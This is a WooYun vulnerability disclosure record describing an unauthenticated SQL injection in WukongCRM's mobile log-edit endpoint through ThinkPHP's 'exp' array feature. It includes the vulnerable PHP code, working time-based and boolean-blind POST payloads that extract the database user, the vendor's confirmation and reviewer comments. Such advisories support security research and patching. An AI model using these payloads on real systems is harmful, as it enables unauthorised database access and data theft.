{"id": 88559, "wybug_id": "wooyun-2016-0194030", "wybug_title": "悟空CRM无需任何权限的SQL注入漏洞2（ThinkPHP特性）                                      ", "wybug_corp": "郑州卡卡罗特软件科技有限公司", "wybug_author": "phith0n", "wybug_date": "2016-04-08 20:09", "wybug_open_date": "2016-07-10 15:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-14：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-06-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-10：\t细节向公众公开  简要描述： 一个没有权限控制的类，正好又有注入~（给L.N.添堵系列之三）另外厂商分给高点呗，别这么小气~本来不想挖了的。 详细说明：  /App/Lib/Mobile/LogMobile.class.php这个类没有权限验证（_initialize方法）哦~看到edit函数：\n//修改沟通日志public function edit(){\tif($this->isPost()){\t\t$id = isset($_POST['id']) ? intval($_POST['id']) : 0;\t\t$params = json_decode($_POST['params'],true);\t\tif(!is_array($params)){\t\t\t$this->ajaxReturn('非法的数据格式!','非法的数据格式!',2);\t\t}\t\tif(!$id){\t\t\t$this->ajaxReturn('参数错误','参数错误',2);\t\t}\t\t$log = M('Log');\t\t$log -> create($params);\t\t$log -> update_date = time();\t\t$result = $log->save();\t\tif($result){\t\t\t$this->ajaxReturn('修改成功','修改成功',1);\t\t}else{\t\t\t$this->ajaxReturn('修改失败，请重试','修改失败，请重试',2);\t\t}\t}}\n乍一看没啥问题，实际上暗含一个ThinkPHP特性的漏洞，详见我发的 http://**.**.**.**/bugs/wooyun-2010-086737这里create方法先获取所有$params，并根据POST中传入的主键（log_id）来update数据库。而update的where实际上就是 array('log_id', $params['log_id']);只要我传入的$params['role_id']的值是数组，并且数组的第一个参数是exp，那么第二个参数就可以直接填SQL注入语句。直接演示。**.**.**.**/wukongcrm/mobile.php?m=log&a=editPOST数据包：id=1&params={\"log_id\":[\"exp\",\"=sleep(2)\"],\"content\":\"phithon\"}可以sleep两秒：\n\n注入log表中有数据的话，可以使用bool盲注。user()的第一个字符大于0，正确，返回真：\n\nuser()的第一个字符大于200，不正确，返回假：\n\n\n**.**.**.**/wukongcrm/mobile.php?m=log&a=editid=1&params={\"log_id\":[\"exp\",\"=-1 or ord(substr(user(),1,1))>200\"],\"content\":\"phithon\"}\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-04-11 15:45 厂商回复： 感谢关注 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-08 20:13 |    \t\t′雨。  \t\t\t( 普通白帽子  |\t\t\t        Rank:1355 漏洞数:200        | Only Code Never Lie To Me.)\t\t \n  @L.N.     \n     2016-04-08 20:18 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:649 漏洞数:59        | 每个男人心中都住着一个叫小红的88号技师。)\t\t \n  坐等系列三    \n     2016-04-08 21:01 |    \t\thkcs \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:9        | 只是路过)\t\t \n  坐等系列三    \n     2016-04-08 21:11 |    \t\t暗香疏影 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:6        | 我感动哭了)\t\t \n  坐等系列三    \n     2016-04-08 22:31 |    \t\tshlhack‘s bother \t\t\t( 普通白帽子  |\t\t\t        Rank:443 漏洞数:150        | 以前有个梦，后来我醒了)\t\t \n  坐等系列三     \n     2016-04-10 14:06 |    \t\tL.N. \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:6        | 不断进步····)\t\t \n  靠    \n     2016-04-10 15:51 |    \t\t不能忍 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:63        | 要是能重来，我要选李白!)\t\t \n  @L.N. 大牛，我开始质疑你了！    \n     2016-04-12 17:17 |    \t\t小小白帽 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:19        | 致力于代码审计和漏洞挖掘)\t\t \n  这个厂商是七龙珠看多了么    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}